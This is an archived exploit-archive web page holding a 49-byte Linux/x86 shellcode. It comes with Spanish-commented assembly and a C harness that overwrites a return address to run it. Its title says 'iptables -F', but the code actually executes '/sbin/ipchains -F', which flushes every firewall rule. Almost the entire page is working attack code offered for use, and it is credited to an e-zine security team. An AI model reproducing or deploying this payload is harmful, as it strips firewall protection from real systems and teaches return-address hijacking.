<html><head><title>Linux/x86 - iptables -F - 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* 
__asm__(&quot;

sub     $0x4,%esp   ## Con esto conseguimos que la shellcode nunca se
popl    %esp        ## sobreescriba... gracias RaiSe :)

xorl    %edx,%edx   ## %edx a cero
pushl   %edx        ## y ponemos los zeros del final del string en memoria
pushw   $0x462d     ## tenemos -F0000

movl    %esp,%esi   ## wardamos argv[1] en %esi

pushl   %edx        ## 0000-F0000

pushl   $0x736e6961
pushl   $0x68637069 ## ipchains0000-F0000

movl    %esp,%edi   ## wardamos argv[0] en %edi

pushl   $0x2f6e6962
pushl   $0x732f2f2f ## ///sbin/ipchains0000-F0000

movl    %esp,%ebx   ## en %ebx, el nombre de archivo

pushl   %edx        ## 0000///sbin/ipchains0000-F0000
pushl   %esi        ## A[1]0000///sbin/ipchains0000-F0000
pushl   %edi        ## A[0]A[1]0000///sbin/ipchains0000-F0000

movl    %esp,%ecx   ## %ecx apunta a el inicio del argv[]

xorl    %eax,%eax
movb    $0xb,%al
int     $0x80

&quot;);
*/

char c0de[]=
&quot;\x83\xec\x04\x5c\x31\xd2\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x61\x69\x6e\x73&quot;
&quot;\x68\x69\x70\x63\x68\x89\xe7\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3&quot;
&quot;\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;;


/* execve(&quot;///sbin/ipchains&quot;,ARGV,NULL);
 * ARGV[] = {&quot;ipchains&quot;,&quot;-F&quot;,NULL}
 */

int main(void)
{
	long *toRET;
	char vuln[52];

	*(&amp;toRET+2) = (long *)c0de;

	strcpy(vuln, c0de);

	printf(&quot;Shellc0de length: %d\nRunning.......\n\n&quot;, strlen(c0de));
	return(0);
}

/* Sp4rK &lt;sp4rk@netsearch-ezine.com&gt;
 * UNDERSEC Security TEAM
 * NetSearch E-zine
 */



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
